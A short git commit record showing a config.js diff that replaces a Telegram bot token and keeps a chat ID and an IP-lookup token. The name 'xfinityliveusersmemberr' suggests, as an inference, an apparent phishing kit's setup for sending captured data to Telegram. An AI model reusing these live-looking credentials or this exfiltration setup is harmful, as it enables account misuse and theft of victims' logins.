034abc9f82ef1d481fe3d3e39743bd23838e88f1
xfinityliveusersmemberr <jenkinstanika191707@aol.com>
2026-06-18 12:50:46 -0400

    Update config.js

--- config.js
+++ config.js
@@ -1,3 +1,3 @@
-export const TELEGRAM_TOKEN = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw";
+export const TELEGRAM_TOKEN = "8574935347:AAEqwfuQljzSYtgvLdfSXcTtu0B_ObFx-rs";
 export const CHAT_ID = 5710607863;
 export const IP_TOKEN = "34a50f68edba06";
